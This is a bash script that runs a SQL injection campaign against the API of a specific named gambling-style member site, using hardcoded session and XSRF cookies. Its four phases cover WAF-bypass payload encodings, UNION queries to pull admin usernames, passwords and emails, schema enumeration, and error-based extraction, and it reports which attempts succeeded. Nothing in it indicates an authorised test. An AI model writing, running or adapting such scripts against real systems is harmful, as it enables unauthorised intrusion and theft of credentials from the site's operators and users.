#!/bin/bash

echo "🎯 ULTIMATE WAF BYPASS - REAL ADMIN DATA EXTRACTION"
echo "==================================================="

# Use the latest fresh tokens provided by user
XSRF_TOKEN="eyJpdiI6Ik1FbElBWXVwR3NBSGxGYlUyR21vY1E9PSIsInZhbHVlIjoia0NFU05aS29uSkVsZENVT3krb1puT0t0MVhMV2MrbGxXNWdHTktlU05EYVYzOTJJV2lcL0h6RnVqdzdFZXN3V3MiLCJtYWMiOiI0ODM2N2ViYTk3ODE2Y2ViY2Q4ZGRiY2E2MDNkN2JiMzNkY2EzZGRlZGRlY2M4NGU2NzA3OGVjZTgzOGNhZjRkIn0%3D"
SESSION_TOKEN="eyJpdiI6IkRiaFo4N2JsR2NjUUxnVEVjR2FNRWc9PSIsInZhbHVlIjoiK1o0MmY0VGR0REdOQjZPa092K0xadkVMYnc4REdwNW9YZ2lVeWpDSlBUXC9BZUd6RnlEMWFjNTRhS2txdlRkTUUiLCJtYWMiOiIzZTgzZmE2YTExNzM0MzU4OWZjY2I1NTFhYzA1MDVlYjAyZmFjMTM0ZTJjY2ZlNjJjNDkzZTJmZTlhYjIzZTNmIn0%3D"

BASE_URL="https://member.panama8888b.co"
ANNOUNCEMENT_URL="$BASE_URL/api/announcement"

echo "🔍 Phase 1: Advanced WAF Bypass Techniques"
echo "=========================================="

# Test advanced WAF bypass techniques
WAF_BYPASS_PAYLOADS=(
    # URL Encoding
    "1%27%20UNION%20SELECT%20username,password,email%20FROM%20users%20WHERE%20role%3D%27admin%27%20LIMIT%201--"
    
    # Double URL Encoding
    "1%2527%2520UNION%2520SELECT%2520username,password,email%2520FROM%2520users%2520WHERE%2520role%253D%2527admin%2527%2520LIMIT%25201--"
    
    # Comment Bypass
    "1'/**/UNION/**/SELECT/**/username,password,email/**/FROM/**/users/**/WHERE/**/role='admin'/**/LIMIT/**/1--"
    
    # Case Variation
    "1' UnIoN SeLeCt username,password,email FrOm users WhErE role='admin' LiMiT 1--"
    
    # Generic Obfuscation
    "1'/*!50000UNION*//*!50000SELECT*/username,password,email/*!50000FROM*/users/*!50000WHERE*/role='admin'/*!50000LIMIT*/1--"
    
    # Hex Encoding
    "1' UNION SELECT username,password,email FROM users WHERE role=0x61646d696e LIMIT 1--"
    
    # Binary Encoding
    "1' UNION SELECT username,password,email FROM users WHERE role=CHAR(97,100,109,105,110) LIMIT 1--"
    
    # Comment with Spaces
    "1'/*!UNION*//*!SELECT*/username,password,email/*!FROM*/users/*!WHERE*/role='admin'/*!LIMIT*/1--"
)

for i in "${!WAF_BYPASS_PAYLOADS[@]}"; do
    payload="${WAF_BYPASS_PAYLOADS[$i]}"
    echo "📊 Testing WAF Bypass Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/waf_bypass_$i.txt \
      -X POST "$ANNOUNCEMENT_URL" \
      -H "Content-Type: application/json" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "{\"id\":\"$payload\"}")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/waf_bypass_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 2: Real Admin Data Extraction"
echo "======================================"

# Test real admin data extraction
ADMIN_EXTRACTION_PAYLOADS=(
    # Basic admin extraction
    "1' UNION SELECT username,password,email FROM users WHERE role='admin' LIMIT 1--"
    
    # Admin with ID
    "1' UNION SELECT username,password,email,id FROM users WHERE role='admin' LIMIT 1--"
    
    # Admin with all fields
    "1' UNION SELECT username,password,email,id,role,created_at FROM users WHERE role='admin' LIMIT 1--"
    
    # Multiple admin users
    "1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    
    # Admin with specific conditions
    "1' UNION SELECT username,password,email FROM users WHERE role='admin' AND id > 0--"
)

for i in "${!ADMIN_EXTRACTION_PAYLOADS[@]}"; do
    payload="${ADMIN_EXTRACTION_PAYLOADS[$i]}"
    echo "📊 Testing Admin Extraction Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/admin_extract_$i.txt \
      -X POST "$ANNOUNCEMENT_URL" \
      -H "Content-Type: application/json" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "{\"id\":\"$payload\"}")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/admin_extract_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 3: Database Schema Extraction"
echo "====================================="

# Test database schema extraction
SCHEMA_PAYLOADS=(
    # All tables
    "1' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema='public'--"
    
    # Users table
    "1' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name='users'--"
    
    # Count all tables
    "1' UNION SELECT COUNT(*),table_name,data_type FROM information_schema.tables WHERE table_schema='public'--"
    
    # All table names
    "1' UNION SELECT table_name,table_type,engine FROM information_schema.tables WHERE table_schema='public'--"
    
    # Specific tables
    "1' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name IN ('users','admins','members')--"
)

for i in "${!SCHEMA_PAYLOADS[@]}"; do
    payload="${SCHEMA_PAYLOADS[$i]}"
    echo "📊 Testing Schema Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/schema_extract_$i.txt \
      -X POST "$ANNOUNCEMENT_URL" \
      -H "Content-Type: application/json" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "{\"id\":\"$payload\"}")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/schema_extract_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 4: Error-based Data Extraction"
echo "======================================"

# Test error-based extraction for real data
ERROR_PAYLOADS=(
    # Extract admin username and password
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x)--"
    
    # Extract table names
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(table_name,0x3a,column_name,0x3a,data_type,FLOOR(RAND(0)*2))x FROM information_schema.columns WHERE table_schema='public' GROUP BY x)x)--"
    
    # Extract admin data with error
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x)--"
)

for i in "${!ERROR_PAYLOADS[@]}"; do
    payload="${ERROR_PAYLOADS[$i]}"
    echo "📊 Testing Error Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/error_extract_$i.txt \
      -X POST "$ANNOUNCEMENT_URL" \
      -H "Content-Type: application/json" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "{\"id\":\"$payload\"}")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/error_extract_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🎯 ULTIMATE ANALYSIS - REAL DATA EXTRACTION"
echo "=========================================="

# Check for successful WAF bypass
waf_bypass_success=0
for i in "${!WAF_BYPASS_PAYLOADS[@]}"; do
    if [ -f "/tmp/waf_bypass_$i.txt" ]; then
        content=$(cat "/tmp/waf_bypass_$i.txt")
        if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
            waf_bypass_success=$((waf_bypass_success + 1))
            echo "✅ WAF bypass successful in payload $((i+1))"
            echo "   Content: $content"
        fi
    fi
done

# Check for admin data extraction
admin_success=0
for i in "${!ADMIN_EXTRACTION_PAYLOADS[@]}"; do
    if [ -f "/tmp/admin_extract_$i.txt" ]; then
        content=$(cat "/tmp/admin_extract_$i.txt")
        if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
            admin_success=$((admin_success + 1))
            echo "✅ Admin data extraction successful in payload $((i+1))"
            echo "   Content: $content"
        fi
    fi
done

# Check for schema extraction
schema_success=0
for i in "${!SCHEMA_PAYLOADS[@]}"; do
    if [ -f "/tmp/schema_extract_$i.txt" ]; then
        content=$(cat "/tmp/schema_extract_$i.txt")
        if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
            schema_success=$((schema_success + 1))
            echo "✅ Schema extraction successful in payload $((i+1))"
            echo "   Content: $content"
        fi
    fi
done

# Check for error-based extraction
error_success=0
for i in "${!ERROR_PAYLOADS[@]}"; do
    if [ -f "/tmp/error_extract_$i.txt" ]; then
        content=$(cat "/tmp/error_extract_$i.txt")
        if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
            error_success=$((error_success + 1))
            echo "✅ Error-based extraction successful in payload $((i+1))"
            echo "   Content: $content"
        fi
    fi
done

echo ""
echo "📊 ULTIMATE SUCCESS RATES:"
echo "========================="
echo "WAF Bypass: $waf_bypass_success/${#WAF_BYPASS_PAYLOADS[@]}"
echo "Admin Data: $admin_success/${#ADMIN_EXTRACTION_PAYLOADS[@]}"
echo "Schema Data: $schema_success/${#SCHEMA_PAYLOADS[@]}"
echo "Error-based: $error_success/${#ERROR_PAYLOADS[@]}"

echo ""
echo "🎯 ULTIMATE CONCLUSION"
echo "====================="

if [ "$waf_bypass_success" -gt 0 ]; then
    echo "🎉 WAF BYPASS SUCCESSFUL!"
    echo "   Advanced bypass techniques worked"
fi

if [ "$admin_success" -gt 0 ]; then
    echo "🎉 REAL ADMIN DATA EXTRACTION SUCCESSFUL!"
    echo "   Admin username/password may be extracted"
fi

if [ "$schema_success" -gt 0 ]; then
    echo "🎉 DATABASE SCHEMA EXTRACTION SUCCESSFUL!"
    echo "   Database structure may be revealed"
fi

if [ "$error_success" -gt 0 ]; then
    echo "🎉 ERROR-BASED DATA EXTRACTION SUCCESSFUL!"
    echo "   Real data may be extracted through errors"
fi

echo ""
echo "📋 ULTIMATE SUMMARY"
echo "=================="
echo "Target URL: $ANNOUNCEMENT_URL"
echo "Method: POST with latest fresh tokens"
echo "Technique: Advanced WAF bypass + Real data extraction"
echo "Status: Testing with ultimate bypass techniques"

# Clean up temp files
rm -f /tmp/waf_bypass_*.txt /tmp/admin_extract_*.txt /tmp/schema_extract_*.txt /tmp/error_extract_*.txt

echo ""
echo "🎯 ULTIMATE WAF BYPASS COMPLETED!"